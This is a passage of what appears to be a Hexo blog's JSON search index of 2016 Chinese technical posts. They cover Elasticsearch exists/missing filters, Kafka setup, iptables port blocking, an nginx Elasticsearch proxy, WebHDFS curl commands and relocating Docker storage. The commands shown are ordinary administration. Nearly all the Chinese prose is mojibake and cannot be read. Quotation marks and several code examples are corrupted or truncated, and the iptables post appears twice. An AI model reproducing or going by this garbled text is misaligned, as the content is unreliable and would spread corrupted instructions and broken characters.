å¯¹è¿‡æ»¤å™¨æ²¡æœ‰å½±å“ã€‚ç»“æœå¾ˆå®¹æ˜“ç†è§£ã€‚ä»»ä½•åœ¨ tags å­—æ®µä¸­æœ‰ term çš„æ–‡æ¡£éƒ½ä½œä¸ºå‘½ä¸­ç»“æœè¿”å›äº†ã€‚è¢«æ’é™¤åœ¨å¤–çš„ä¸¤ä¸ªæ–‡æ¡£å°±æ˜¯ 3 å’Œ 4ã€‚missing è¿‡æ»¤å™¨missing è¿‡æ»¤å™¨æœ¬è´¨ä¸Šæ˜¯ exists çš„é€†ï¼šå®ƒè¿”å›å¯¹åº”ä¸€ä¸ªç‰¹å®šçš„å­—æ®µæ²¡æœ‰ä»»ä½•å€¼çš„æ–‡æ¡£ï¼Œå°±åƒ SQLï¼šSELECT tagsFROM postsWHERE tags IS NULLè®©æˆ‘ä»¬ç”¨ missing æ¥æ›¿æ¢ä¸Šé¢ä¾‹å­ä¸­ exists è¿‡æ»¤å™¨ï¼šGET /my_index/posts/_search{ â€œqueryâ€ : { â€œfilteredâ€ : { â€œfilterâ€: { â€œmissingâ€ : { â€œfieldâ€ : â€œtagsâ€ } } } }}æ­£å¦‚ä½ æ‰€æœŸæœ›çš„ï¼Œæˆ‘ä»¬æ‹¿åˆ°äº†åœ¨ tags å­—æ®µä¸Šæ²¡æœ‰çœŸå®å€¼çš„æ–‡æ¡£â€”â€”æ–‡æ¡£ 3 å’Œ 4ï¼šâ€œhitsâ€ : åœ¨ null è¡¨ç¤º null æ—¶æœ‰æ—¶å€™ä½ éœ€è¦èƒ½å¤ŸåŒºåˆ†å­—æ®µæ²¡æœ‰å€¼å’Œå­—æ®µè¢«æ˜¾å¼åœ°è®¾ç½®ä¸º nullã€‚æ ¹æ®æˆ‘ä»¬å‰é¢çœ‹åˆ°çš„é»˜è®¤è¡Œä¸ºï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ï¼›æ•°æ®ä¸¢å¤±äº†ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªå ä½ç¬¦æ¥æ›¿æ¢æ˜¾å¼çš„ nullã€‚å½“æŒ‡å®šä¸€ä¸ª stringã€numericã€Boolean æˆ–è€…æ—¥æœŸå­—æ®µæ—¶ï¼Œä½ åŒæ ·èƒ½è®¾ç½® null_value å¯ä»¥ç”¨åœ¨ä»»ä½•é‡åˆ°æ˜¾å¼çš„ null å€¼çš„åœ°æ–¹ã€‚æ²¡æœ‰ä¸€ä¸ªå€¼çš„å­—æ®µæ˜¾ç„¶å¯ä»¥ä»å€’æ’ç´¢å¼•ä¸­æ’é™¤ã€‚é€‰æ‹©åˆé€‚çš„ null_valueï¼Œç¡®ä¿ä¸‹é¢çš„äº‹é¡¹ï¼šåŒ¹é…äº†å­—æ®µçš„ç±»å‹ï¼ˆtypeï¼‰ã€‚ä½ ä¸èƒ½åœ¨ä¸€ä¸ªç±»å‹ä¸º date çš„å­—æ®µä¸Šç”¨ä¸€ä¸ª string çš„ null_valueä¸åŒäºå­—æ®µå¯èƒ½åŒ…å«çš„æ­£å¸¸å€¼ï¼Œæ¥é¿å…å‡ºä»¤äººå›°æƒ‘çš„å‡ºç° null çš„çœŸå®å€¼exists/missing on Objectsexists/missing è¿‡æ»¤å™¨åŒæ ·å¯ä»¥ç”¨åœ¨å†…éƒ¨å¯¹è±¡ä¸Šï¼ˆinner objectsï¼‰ï¼Œä¸ä»…ä»…æ ¸å¿ƒç±»å‹ï¼ˆcore typesï¼‰ã€‚å‡å¦‚æœ‰ä¸‹é¢çš„æ–‡æ¡£{ â€œnameâ€ : { â€œfirstâ€ : â€œJohnâ€, â€œlastâ€ : â€œSmithâ€ }}ä½ å¯ä»¥æ£€æŸ¥ name.first å’Œ name.last ä¸ä»…ä»…æ˜¯ name çš„å­˜åœ¨ã€‚ç„¶è€Œï¼Œåœ¨https://www.elastic.co/guide/en/elasticsearch/guide/current/mapping.htmlä¸­ï¼Œæˆ‘ä»¬æåˆ°å¯¹è±¡åœ¨å†…éƒ¨ä¼šè¿›è¡Œå¹³åŒ–å±•å¼€æˆä¸€ä¸ªç®€å•çš„å­—æ®µå€¼ç»“æ„ï¼Œåƒè¿™æ ·ï¼š{ â€œname.firstâ€ : â€œJohnâ€, â€œname.lastâ€ : â€œSmithâ€}æ‰€ä»¥ï¼Œæˆ‘ä»¬å¦‚ä½•åœ¨ name å­—æ®µä¸Šä½¿ç”¨ exists å’Œ missing è¿‡æ»¤å™¨ï¼Œè¿™å®é™…ä¸Šå¹¶ä¸å­˜åœ¨äºå€’æ’ç´¢å¼•ä¸­ï¼Ÿå…¶åŸå› å°±æ˜¯ï¼Œè¿™ä¼šæŒ‰ç…§å¦‚ä¸‹çš„è¿‡æ»¤å™¨é‚£æ ·ï¼š{ â€œexistsâ€ : { â€œfieldâ€ : â€œnameâ€ }}å®é™…ä¸Šæ˜¯æŒ‰ç…§ï¼š{ â€œboolâ€: { â€œshouldâ€: }}æ‰§è¡Œçš„ã€‚è¿™æ ·ä¹Ÿæ„å‘³ç€å¦‚æœ first å’Œ last åŒæ—¶æ˜¯ç©ºï¼Œname å‘½åç©ºé—´å°±ä¸ä¼šå­˜åœ¨ã€‚æ–‡ï¼Not_GODï¼ˆç®€ä¹¦ä½œè€…ï¼‰åŸæ–‡é“¾æ¥ï¼šhttp://www.jianshu.com/p/7a5d706336f1è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ï¼Œè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œå¹¶æ ‡æ³¨â€œç®€ä¹¦ä½œè€…â€ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"kafka å®‰è£…æµ‹è¯•","slug":"history/tech/5953c4d0c2b92f5665eeda27","date":"2016-04-08T00:04:57.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda27/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda27/","excerpt":"","text":"kafka ï¼ˆå®˜ç½‘åœ°å€ï¼šhttp://kafka.apache.org/ï¼‰æ˜¯ä¸€æ¬¾åˆ†å¸ƒå¼æ¶ˆæ¯å‘å¸ƒå’Œè®¢é˜…çš„ç³»ç»Ÿï¼Œå…·æœ‰é«˜æ€§èƒ½å’Œé«˜ååç‡ã€‚http://blog.qianrushi.org/forum.php?mod=image&amp;aid=1&amp;size=300x300&amp;key=fa4c16801b769fad&amp;nocache=yes&amp;type=fixnonei. æ¶ˆæ¯çš„å‘å¸ƒï¼ˆpublishï¼‰ç§°ä½œproducerï¼Œæ¶ˆæ¯çš„è®¢é˜…ï¼ˆsubscribeï¼‰ç§°ä½œconsumerï¼Œä¸­é—´çš„å­˜å‚¨é˜µåˆ—ç§°ä½œbrokerã€‚ii. å¤šä¸ªbrokerååŒåˆä½œï¼Œproducerã€consumerå’Œbrokerä¸‰è€…ä¹‹é—´é€šè¿‡zookeeperæ¥åè°ƒè¯·æ±‚å’Œè½¬å‘ã€‚iii. produceräº§ç”Ÿå’Œæ¨é€(push)æ•°æ®åˆ°brokerï¼Œconsumerä»brokeræ‹‰å–(pull)æ•°æ®å¹¶è¿›è¡Œå¤„ç†ã€‚iv. brokerç«¯ä¸ç»´æŠ¤æ•°æ®çš„æ¶ˆè´¹çŠ¶æ€ï¼Œæå‡äº†æ€§èƒ½ã€‚v. ç›´æ¥ä½¿ç”¨ç£ç›˜è¿›è¡Œå­˜å‚¨ï¼Œçº¿æ€§è¯»å†™ï¼Œé€Ÿåº¦å¿«ï¼šé¿å…äº†æ•°æ®åœ¨JVMå†…å­˜å’Œç³»ç»Ÿå†…å­˜ä¹‹é—´çš„å¤åˆ¶ï¼Œå‡å°‘è€—æ€§èƒ½çš„åˆ›å»ºå¯¹è±¡å’Œåƒåœ¾å›æ”¶ã€‚vi. Kafkaä½¿ç”¨scalaç¼–å†™ï¼Œå¯ä»¥è¿è¡Œåœ¨JVMä¸Šã€‚å®‰è£…ï¼ša. é¦–å…ˆå®‰è£…JRE/JDKb. ä¸‹è½½kafkaè¿›å…¥ä¸‹è½½é¡µé¢ï¼šhttp://kafka.apache.org/downloads.htmlé€‰æ‹©Binary downloadsä¸‹è½½ ï¼ˆSource downloadéœ€è¦ç¼–è¯‘æ‰èƒ½ä½¿ç”¨ï¼‰ä¹Ÿå¯ä»¥ç›´æ¥åœ¨linuxç»ˆç«¯ä¸‹è½½ wget -q http://apache.fayea.com/apache-mirror/kafka/0.8.1/kafka_2.8.0-0.8.1.tgzc. è§£å‹tar -xzvf kafka_2.8.0-0.8.1.tgzrm kafka_2.8.0-0.8.1.tgzcd kafka_2.8.0-0.8.1ç›®å½•ï¼š[attach]2[/attach]/bin å¯åŠ¨å’Œåœæ­¢å‘½ä»¤ç­‰ã€‚/config é…ç½®æ–‡ä»¶/libs ç±»åº“d. ä¿®æ”¹é…ç½®Kafkaé»˜è®¤å¼€å¯JVMå‹ç¼©æŒ‡é’ˆï¼Œä½†åªæ˜¯åœ¨64ä½çš„HotSpot VMå—æ”¯æŒï¼Œå¦‚æœå®‰è£…äº†32ä½çš„HotSpot VMï¼Œéœ€è¦ä¿®æ”¹**/bin/kafka-run-class.sh**æ–‡ä»¶vi bin/kafka-run-class.shæ‰¾åˆ°å¦‚ä¸‹è¡Œï¼šKAFKA_JVM_PERFORMANCE_OPTS=&quot;-server -XX:+UseCompressedOops -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+CMSScavengeBeforeRemark -XX:+DisableExplicitGC -Djava.awt.headless=true&quot;å»é™¤-XX:+UseCompressedOopså‚æ•°å¯åŠ¨å’Œåœæ­¢å¯åŠ¨Zookeeper serverï¼šbin/zookeeper-server-start.sh config/zookeeper.properties &amp;&amp;æ˜¯ä¸ºäº†èƒ½é€€å‡ºå‘½ä»¤è¡Œå¯åŠ¨Kafka server:bin/kafka-server-start.sh config/server.properties &amp;åœæ­¢Kafka serverbin/kafka-server-stop.shåœæ­¢Zookeeper server:bin/zookeeper-server-stop.shå•æœºè¿é€šæ€§æµ‹è¯•è¿è¡Œproducerï¼šbin/kafka-console-producer.sh --broker-list localhost:9092 --topic testæ—©ç‰ˆæœ¬çš„Kafkaï¼Œâ€“broker-list localhost:9092éœ€æ”¹ä¸ºâ€“zookeeper localhost:2181è¿è¡Œconsumerï¼šbin/kafka-console-consumer.sh --zookeeper localhost:2181 --topic test --from-beginningåœ¨producerç«¯è¾“å…¥å­—ç¬¦ä¸²å¹¶å›è½¦ï¼ŒæŸ¥çœ‹consumerç«¯æ˜¯å¦æ˜¾ç¤ºã€‚åˆ†å¸ƒå¼è¿é€šæ€§æµ‹è¯•Zookeeper Server, Kafka Server, Produceréƒ½æ”¾åœ¨æœåŠ¡å™¨server1ä¸Šï¼Œipåœ°å€ä¸º192.168.1.10Consumeræ”¾åœ¨æœåŠ¡å™¨server2ä¸Šï¼Œipåœ°å€ä¸º192.168.1.12ã€‚åˆ†åˆ«è¿è¡Œserver1çš„producerå’Œserver2çš„consumerï¼Œbin/kafka-console-producer.sh --broker-list 192.168.1.10:9092 --topic testbin/kafka-console-consumer.sh --zookeeper 192.168.1.10:2181 --topic test --from-beginningåœ¨producerçš„consoleç«¯è¾“å…¥å­—ç¬¦ä¸²ï¼ŒconsumeræŠ¥Connection refusedé”™è¯¯ï¼š [attach]3[/attach]broker, producerå’Œconsumeréƒ½æ³¨å†Œåˆ°zookeeperä¸Šï¼Œproducerå’Œconsumerçš„å‚æ•°æ˜ç¡®æŒ‡å®šã€‚é—®é¢˜å‡ºåœ¨brokerçš„é…ç½®æ–‡ä»¶server.propertiesä¸Šï¼š# Hostname the broker will bind to. If not set, the server will bind to all interfaces#host.name=localhost hoståç§°æ²¡æœ‰æŒ‡å®šï¼Œå°±æ˜¯127.0.0.1ï¼Œconsumerå»brokeræ‹¿æ•°æ®å°±æœ‰é—®é¢˜ã€‚è®¾ç½®ä¸º192.168.1.10ï¼Œé‡å¯æœåŠ¡å°±å¥½äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"kafka","slug":"kafka","permalink":"https://wangxiuwen.github.io/tags/kafka/"}],"author":"wangxiuwen"},{"title":"iptables ç¦æ­¢ç«¯å£è®¿é—®","slug":"history/tech/5953c4d0c2b92f5665eeda25","date":"2016-04-07T23:55:26.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda25/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda25/","excerpt":"","text":"iptables -A INPUT -p tcp --dport 19999 -s 127.0.0.0/8 -j ACCEPTiptables -A INPUT -p tcp --dport 19999 -j REJECT --reject-with icmp-port-unreachable","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"iptables ç¦æ­¢ç«¯å£è®¿é—®","slug":"history/tech/5953c4d0c2b92f5665eeda26","date":"2016-04-07T23:55:26.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda26/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda26/","excerpt":"","text":"iptables -A INPUT -p tcp --dport 19999 -s 127.0.0.0/8 -j ACCEPTiptables -A INPUT -p tcp --dport 19999 -j REJECT --reject-with icmp-port-unreachable","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"nginx elasticsearch ä»£ç†é…ç½®","slug":"history/tech/5953c4d0c2b92f5665eeda28","date":"2016-04-07T19:13:26.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda28/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda28/","excerpt":"","text":"proxy_cache_path /var/cache/nginx/cache keys_zone=elasticsearch:10m inactive=60m;upstream elasticsearch_servers {zone elasticsearch_servers 64K;server 192.168.187.132:9200;server 192.168.187.133:9200;}match statusok {status 200;header Content-Type ~ â€œapplication/jsonâ€;body ~ â€˜â€œstatusâ€ : 200â€™;}server {listen 9200;status_zone elasticsearch;location / {proxy_pass http://elasticsearch_servers;proxy_http_version 1.1;proxy_set_header Connection â€œâ€;proxy_cache elasticsearch;proxy_cache_valid 200 302 10m;proxy_cache_valid 404 1m;proxy_connect_timeout 5s;proxy_read_timeout 10s;health_check interval=5s fails=1 passes=1 uri=/ match=statusok;}# redirect server error pages to the static page /50x.htmlerror_page 500 502 503 504 /50x.html;location = /50x.html {root /usr/share/nginx/html;}access_log logs/es_access.log combined;}server {listen 8080;root /usr/share/nginx/html;location / {index status.html;}location =/status {status;}}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"Hadoop webHDFSè®¾ç½®å’Œä½¿ç”¨è¯´æ˜","slug":"history/tech/5953c4d0c2b92f5665eeda24","date":"2016-04-07T03:52:53.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda24/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda24/","excerpt":"","text":"1.é…ç½®namenodeçš„hdfs-site.xmlæ˜¯å¿…é¡»å°†dfs.webhdfs.enabledå±æ€§è®¾ç½®ä¸ºtrueï¼Œå¦åˆ™å°±ä¸èƒ½ä½¿ç”¨webhdfsçš„LISTSTATUSã€LISTFILESTATUSç­‰éœ€è¦åˆ—å‡ºæ–‡ä»¶ã€æ–‡ä»¶å¤¹çŠ¶æ€çš„å‘½ä»¤ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯éƒ½æ˜¯ç”±namenodeæ¥ä¿å­˜çš„ã€‚åœ¨namenodeå’Œä¸€å°datanodeä¸­å‘/etc/hadoop/conf/hdfs-site.xmlä¸­æ·»åŠ å±æ€§ï¼šåŒå‡»ä»£ç å…¨é€‰dfs.webhdfs.enabledtrue2.ä½¿ç”¨è¯´æ˜è®¿é—®namenodeçš„hdfsä½¿ç”¨50070ç«¯å£ï¼Œè®¿é—®datanodeçš„webhdfsä½¿ç”¨50075ç«¯å£ã€‚è®¿é—®æ–‡ä»¶ã€æ–‡ä»¶å¤¹ä¿¡æ¯ä½¿ç”¨namenodeçš„IPå’Œ50070ç«¯å£ï¼Œè®¿é—®æ–‡ä»¶å†…å®¹æˆ–è€…è¿›è¡Œæ‰“å¼€ã€ä¸Šä¼ ã€ä¿®æ”¹ã€ä¸‹è½½ç­‰æ“ä½œä½¿ç”¨datanodeçš„IPå’Œ50075ç«¯å£ã€‚è¦æƒ³ä¸åŒºåˆ†ç«¯å£ï¼Œç›´æ¥ä½¿ç”¨namenodeçš„IPå’Œç«¯å£è¿›è¡Œæ‰€æœ‰çš„webhdfsæ“ä½œï¼Œå°±éœ€è¦åœ¨æ‰€æœ‰çš„datanodeä¸Šéƒ½è®¾ç½®hefs-site.xmlä¸­çš„dfs.webhdfs.enabledä¸ºtrueã€‚3.curlæ“ä½œwebhdfsåˆ›å»ºå¹¶å†™ä¸€ä¸ªæ–‡ä»¶curl -i -X PUT &quot;http://localhost:50070/webhdfs/v1/?op=CREATEâ€œcurl -i -X PUT -T &lt;LOCAL_FILE&gt; &quot;http://:/webhdfs/v1/?op=CREATEâ€¦â€œæ³¨æ„è¿™ä¸ªåœ°æ–¹å¡«å…¥çš„æ˜¯DataNodeçš„ä¿¡æ¯åœ¨ä¸€ä¸ªæ–‡ä»¶å†…è¿½åŠ å†…å®¹curl -i -X POST &quot;http://:/webhdfs/v1/?op=APPENDâ€curl -i -X POST -T &lt;LOCAL_FILE&gt; &quot;http://:/webhdfs/v1/?op=APPENDâ€¦â€œæ³¨æ„è¯¥æ¡å‘½ä»¤è·å¾—çš„æ˜¯DataNodeçš„ä¿¡æ¯ã€‚æ‰“å¼€å¹¶è¯»å–ä¸€ä¸ªæ–‡ä»¶curl -i -L &quot;http://:/webhdfs/v1/?op=OPENâ€œåˆ›å»ºä¸€ä¸ªç›®å½•curl -i -X PUT &quot;http://:/?op=MKDIRSâ€œé‡åå‘½æ–‡ä»¶ã€æ–‡ä»¶å¤¹curl -i -X PUT â€œ:/webhdfs/v1/?op=RENAME&amp;destination=â€åˆ é™¤æ–‡ä»¶/æ–‡ä»¶å¤¹curl -i -X DELETE &quot;http://:/webhdfs/v1/?op=DELETE â€œæ–‡ä»¶/ æ–‡ä»¶å¤¹çš„çŠ¶æ€ä¿¡æ¯curl -i â€œhttp://:/webhdfs/v1/?op=GETFILESTATUSâ€œç›®å½•åˆ—è¡¨curl -i &quot;http://:/webhdfs/v1/?op=LISTSTATUSâ€è·å–ç›®å½•çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ±‡æ€»ä¿¡æ¯curl -i â€œhttp://:/webhdfs/v1/?op=GETCONTENTSUMMARYâ€è·å–Check Sum Filecurl -i &quot;http://:/webhdfs/v1/?op=GETFILECHECKSUMâ€è·å–Home ç›®å½•curl -i &quot;http://:/webhdfs/v1/?op=GETHOMEDIRECTORYâ€è®¾ç½®æƒé™curl -i -X PUT &quot;http://:/webhdfs/v1/?op=SETPERMISSION â€œè®¾ç½®æ‰€æœ‰è€…curl -i -X PUT &quot;http://:/webhdfs/v1/?op=SETOWNER &quot;è®¾ç½®å¤‡ä»½curl -i -X PUT &quot;http://:/webhdfs/v1/?op=SETREPLICATION â€œ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"hdfs","slug":"hdfs","permalink":"https://wangxiuwen.github.io/tags/hdfs/"}],"author":"wangxiuwen"},{"title":"æ”¹ hadoop ssh ç«¯å£","slug":"history/tech/5953c4d0c2b92f5665eeda23","date":"2016-04-07T03:48:07.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda23/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda23/","excerpt":"","text":"hadoop-env.shé‡Œæ”¹ä¸‹ã€‚å¦‚ï¼šexport HADOOP_SSH_OPTS=&quot;-p 1234&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"hdfs","slug":"hdfs","permalink":"https://wangxiuwen.github.io/tags/hdfs/"}],"author":"wangxiuwen"},{"title":"ä¿®æ”¹Dockeré•œåƒçš„å­˜å‚¨ä½ç½®","slug":"history/tech/5953c4d0c2b92f5665eeda22","date":"2016-04-04T18:58:34.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda22/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda22/","excerpt":"","text":"Dockerçš„é•œåƒä»¥åŠä¸€äº›æ•°æ®éƒ½æ˜¯åœ¨/var/lib/dockerç›®å½•ä¸‹ï¼Œå®ƒå ç”¨çš„æ˜¯Linuxçš„ç³»ç»Ÿåˆ†åŒºï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„/dev/vda1,å½“æœ‰å¤šä¸ªé•œåƒæ—¶ï¼Œ/dev/vda1çš„ç©ºé—´å¯èƒ½ä¸è¶³ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠdockerçš„æ•°æ®æŒ‚è½½åˆ°æ•°æ®ç›˜ï¼Œä¾‹å¦‚ï¼š/dev/vdbç›®å½•ä¸‹ã€‚# df -lhTFilesystem Type Size Used Avail Use% Mounted on/dev/vda1 xfs 20G 3.8G 16G 20% /devtmpfs devtmpfs 916M 0 916M 0% /devtmpfs tmpfs 921M 0 921M 0% /dev/shmtmpfs tmpfs 921M 43M 878M 5% /runtmpfs tmpfs 921M 0 921M 0% /sys/fs/cgroup/dev/vdb xfs 100G 11G 90G 11% /data å…¶ä¸­ä¸»è¦çš„æ­¥éª¤å¦‚ä¸‹ï¼šï¼ˆ1ï¼‰ é¦–å…ˆï¼Œå¤‡ä»½fstabæ–‡ä»¶sudo cp /etc/fstab /etc/fstab.$(date +%Y-%m-%d)ï¼ˆ2ï¼‰ åœæ­¢dockerï¼Œ ç”¨rsyncåŒæ­¥/var/lib/dockeråˆ°æ–°ä½ç½®. å¦‚æœrsyncæ²¡æœ‰å®‰è£…ï¼Œåˆ™ä½¿ç”¨yum -y intall rsync è¿›è¡Œå®‰è£…ï¼Œåœæ­¢docker ,service docker stop,åœ¨æ•°æ®åˆ†åŒºä¸­å»ºç«‹è¦æŒ‚è½½çš„ç›®å½•ï¼Œmkdir /data/docker ä½¿ç”¨rsyncå·¥å…·åŒæ­¥ï¼Œrsync -aXS /var/lib/docker/. /data/docker/ï¼Œè¿™å¯èƒ½éœ€è¦èŠ±è´¹çš„è¾ƒé•¿çš„æ—¶é—´ï¼Œå–å†³äº/var/lib/dockerçš„å¤§å°ï¼Œï¼ˆ3ï¼‰ ä¿®æ”¹fstabåœ¨è¯¥æ–‡ä»¶ä¸­æŠŠä¸‹é¢ä¸€è¡Œæ·»åŠ åˆ°fstabé‡Œï¼Œå°†æ–°ä½ç½®æŒ‚è½½åˆ° /var/lib/docker/data/docker /var/lib/docker none bind 0 0æ–‡ä»¶çš„å†…å¦‚å¦‚ä¸‹ï¼š# cat /etc/fstab ## /etc/fstab# Created by anaconda on Thu Jul 31 07:50:13 2014## Accessible filesystems, by reference, are maintained under â€˜/dev/diskâ€™# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info#/dev/vda1 / xfs errors=remount-ro 0 1/swapfile none swap defaults 0 0/dev/vdb /data xfs defaults,noatime 0 0/data/docker /var/lib/docker none bind 0 0ï¼ˆ4ï¼‰ é‡æ–°æŒ‚è½½mount â€“aï¼ˆ5ï¼‰ ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹ df /var/lib/docker/Filesystem 1K-blocks Used Available Use% Mounted on/dev/vdb 104806400 47204 104759196 1% /var/lib/dockerï¼ˆ6ï¼‰è¿›å…¥ContaineræŸ¥çœ‹æˆ‘ä»¬çš„ç©ºé—´bash-4.1# df -lhTFilesystem Type Size Used Avail Use% Mounted onrootfs rootfs 9.8G 1.4G 7.9G 15% /tmpfs tmpfs 921M 0 921M 0% /devshm tmpfs 64M 0 64M 0% /dev/shm/dev/vdb xfs 100G 2.1G 98G 3% /etc/resolv.conf/dev/vdb xfs 100G 2.1G 98G 3% /etc/hostname/dev/vdb xfs 100G 2.1G 98G 3% /etc/hoststmpfs tmpfs 921M 0 921M 0% /run/secretstmpfs tmpfs 921M 0 921M 0% /proc/kcoreæ²¡æœ‰æ›´æ”¹/var/lib/dockerè·¯å¾„ä¹‹å‰çš„æƒ…å†µï¼šbash-4.1# df -lhTFilesystem Type Size Used Avail Use% Mounted onrootfs rootfs 9.8G 1.4G 7.9G 15% /tmpfs tmpfs 921M 0 921M 0% /devshm tmpfs 64M 0 64M 0% /dev/shm/dev/vda1 xfs 20G 13G 6.9G 66% /etc/resolv.conf/dev/vda1 xfs 20G 13G 6.9G 66% /etc/hostname/dev/vda1 xfs 20G 13G 6.9G 66% /etc/hoststmpfs tmpfs 921M 0 921M 0% /run/secretstmpfs tmpfs 921M 0 921M 0% /proc/kcoreå®¿ä¸»æœºä¸­çš„åˆ†åŒºå¤§å°ä¿¡æ¯ï¼š# df -lhTFilesystem Type Size Used Avail Use% Mounted on/dev/vda1 xfs 20G 13G 6.9G 65% /devtmpfs devtmpfs 916M 0 916M 0% /devtmpfs tmpfs 921M 0 921M 0% /dev/shmtmpfs tmpfs 921M 89M 832M 10% /runtmpfs tmpfs 921M 0 921M 0% /sys/fs/cgroup/dev/vdb xfs 100G 33M 100G 1% /data","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"check_os.shé—®é¢˜(è½¬)","slug":"history/tech/5953c4d0c2b92f5665eeda21","date":"2016-04-04T02:28:40.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda21/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda21/","excerpt":"","text":"1.å®‰è£…snmpdåï¼ŒæŒ‰æ–‡æ¡£é…ç½® åˆ°2.7æ­¥ï¼Œè¾“å‡ºæ­£å¸¸ã€‚å¯æ˜¯ç•Œé¢æ˜¾ç¤ºsnmpå´æ˜¯å¤±è´¥ã€‚ æŸ¥æ‰¾åŸå› 